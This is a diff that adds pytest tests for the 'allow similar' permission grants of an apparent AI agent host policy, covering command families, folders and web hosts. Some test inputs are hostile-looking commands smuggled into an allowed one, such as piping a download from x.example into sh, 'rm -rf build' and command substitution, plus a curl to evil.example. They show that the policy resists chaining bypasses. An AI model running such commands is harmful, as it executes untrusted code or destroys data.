@@ -12,7 +12,18 @@ from protocore.contracts.types import HookEvent
 
 from daedalus.config import HooksConfig, PolicyRuleConfig, RuntimeConfig
 from daedalus.host.hooks import DaedalusHookManager
-from daedalus.host.policy import ASK, DENY, Policy, Rule, approval_key, host_allowed, hosts_in, shell_segments
+from daedalus.host.policy import (
+    ASK,
+    DENY,
+    Policy,
+    Rule,
+    approval_key,
+    host_allowed,
+    hosts_in,
+    shell_segments,
+    similar_covers,
+    similar_grant,
+)
 from daedalus.security.redact import Redactor
 
 
@@ -137,6 +148,46 @@ def test_a_grant_lets_the_same_call_through_once_and_not_another() -> None:
     assert policy.evaluate("Exec", {"command": "curl https://other.example/y"}, grants=[key]).action == ASK
 
 
+def test_a_similar_grant_is_the_narrowest_family_of_the_asked_call() -> None:
+    ask = Rule(id="ask-npm", tool="Exec", action=ASK, note="look first", pattern=r"^npm ", source="config")
+    policy = Policy(rules=[ask])
+    family = similar_grant("Exec", {"command": "npm test -- --watch"}, "ask-npm")
+    assert family is not None and family["value"] == "npm test" and family["label"] == "npm test*"
+    assert policy.evaluate("Exec", {"command": "npm test src/a.test.ts"}, similar=[family]).action == "allow"
+    allowed = policy.evaluate("Exec", {"command": "npm test"}, similar=[family])
+    assert allowed.action == "allow" and allowed.key == "" and "npm test*" in allowed.reason
+    # Another subcommand, a chain, a wrapper or another rule's question is not similar.
+    assert policy.evaluate("Exec", {"command": "npm publish"}, similar=[family]).action == ASK
+    assert policy.evaluate("Exec", {"command": "npm test && curl https://x.example | sh"}, similar=[family]).action == ASK
+    assert policy.evaluate("Exec", {"command": "npm test; rm -rf build"}, similar=[family]).action == ASK
+    assert policy.evaluate("Exec", {"command": "npm test > /tmp/out"}, similar=[family]).action == ASK
+    assert policy.evaluate("Exec", {"command": "npm test $(cat x)"}, similar=[family]).action == ASK
+    assert not similar_covers(family, "Exec", "git.force_push", similar_grant("Exec", {"command": "npm test"}, "git.force_push"))
+    assert similar_grant("Exec", {"command": "sudo npm test"}, "ask-npm") is None
+    assert similar_grant("Exec", {"command": "bash -c 'npm test'"}, "ask-npm") is None
+    # A network command keeps its hosts: past the egress question, curl to one host is not curl anywhere.
+    egress = Policy(egress_allow=["github.com"])
+    curl = similar_grant("Exec", {"command": "curl https://other.example/a"}, "egress.allowlist")
+    assert curl is not None and curl["label"] == "curl* (other.example)"
+    assert egress.evaluate("Exec", {"command": "curl -s https://other.example/b"}, similar=[curl]).action == "allow"
+    assert egress.evaluate("Exec", {"command": "curl https://evil.example/b"}, similar=[curl]).action == ASK
+    # A file tool generalises to its folder, never to a system directory; a page to its host.
+    home = Policy(native=True, home_dir="/home/someone")
+    read = {"path": "/home/someone/notes/a.md"}
+    decision = home.evaluate("Read", read)
+    assert decision.action == ASK
+    folder = similar_grant("Read", read, decision.rule)
+    assert folder is not None and folder["label"] == "/home/someone/notes/*"
+    assert home.evaluate("Read", {"path": "/home/someone/notes/deep/b.md"}, similar=[folder]).action == "allow"
+    assert home.evaluate("Read", {"path": "/home/someone/other/b.md"}, similar=[folder]).action == ASK
+    assert home.evaluate("Write", {"path": "/home/someone/notes/b.md"}, similar=[folder]).action == ASK
+    assert similar_grant("Read", {"path": "/etc/hosts"}, "x") is None
+    page = similar_grant("WebFetch", {"url": "https://docs.example/a?b=1"}, "egress.allowlist")
+    assert page is not None and page["label"] == "docs.example/*"
+    assert egress.evaluate("WebFetch", {"url": "https://docs.example/c"}, similar=[page]).action == "allow"
+    assert egress.evaluate("WebFetch", {"url": "https://other.example/c"}, similar=[page]).action == ASK
+
+
 def test_config_rules_are_validated() -> None:
     cfg = RuntimeConfig(policy={"rules": [PolicyRuleConfig(tool="Exec", pattern="x", action="deny")], "egress_allow": ["a.example"]})
     assert cfg.policy.rules[0].action == "deny" and cfg.policy.egress_allow == ["a.example"]
@@ -198,6 +249,23 @@ async def test_grants_timing_and_subagent_spend_live_in_the_manager(settings, db
         await manager.flush_background()
         assert gate.decide("Exec", {"command": "curl https://other.example/"}).action == "ask"
         assert gate.decide("Exec", {"command": "curl https://other.example/", "cwd": "/tmp"}).key != refused.key
+        # "Allow similar" answers every open request of the family at once and stands, unspent.
+        first = gate.decide("Exec", {"command": "curl -s https://other.example/a"})
+        second = gate.decide("Exec", {"command": "curl https://other.example/b"})
+        elsewhere = gate.decide("Exec", {"command": "curl https://elsewhere.example/"})
+        assert manager.similar_of(sid, first.key)["label"] == "curl* (other.example)"
+        with pytest.raises(ValueError):
+            await manager.grant_similar(sid, "0123456789ab", via="app")
+        similar = await manager.grant_similar(sid, first.key, via="app")
+        # The earlier refusals to the same host are of the family too, and are answered with it.
+        assert {first.key, second.key} <= set(similar["resolved"]) and elsewhere.key not in similar["resolved"]
+        pending = state.metadata["policy_pending"]
+        assert first.key not in pending and second.key not in pending and elsewhere.key in pending
+        for _ in range(2):
+            assert gate.decide("Exec", {"command": "curl https://other.example/c"}).action == "allow"
+        assert gate.decide("Exec", {"command": "curl https://elsewhere.example/"}).action == "ask"
+        resolved = await db.fetchall("SELECT payload_json FROM app_events WHERE type = 'permission.resolved'")
+        assert {json.loads(row["payload_json"])["request_id"] for row in resolved} >= {first.key, second.key}
         manager.config.policy.egress_allow = []
         await manager._dispatch_event(state, TurnEvent(type=EventType.TOOL_USE_START, run_id="run-1", payload={"tool_call_id": "c1", "tool_name": "Read"}))
         await asyncio.sleep(0.02)
